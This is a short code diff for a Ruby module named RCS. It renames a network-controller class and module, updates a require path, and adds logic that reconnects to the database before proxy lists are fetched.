@@ -4,7 +4,7 @@
 #
 
 # relatives
-require_relative 'nc_protocol.rb'
+require_relative 'protocol'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -15,9 +15,9 @@ require 'openssl'
 require 'timeout'
 
 module RCS
-module Collector
+module Controller
 
-class NetworkController
+class Network
   extend RCS::Tracer
 
   # TODO: check this for release
@@ -25,6 +25,10 @@ class NetworkController
   MIN_INJECTOR_VERSION = 2013103101
   
   def self.check
+
+    # if the database connection has gone
+    # try to re-login to the database again
+    DB.instance.connect!(:controller) if not DB.instance.connected?
 
     # retrieve the lists from the db
     elements = DB.instance.proxies
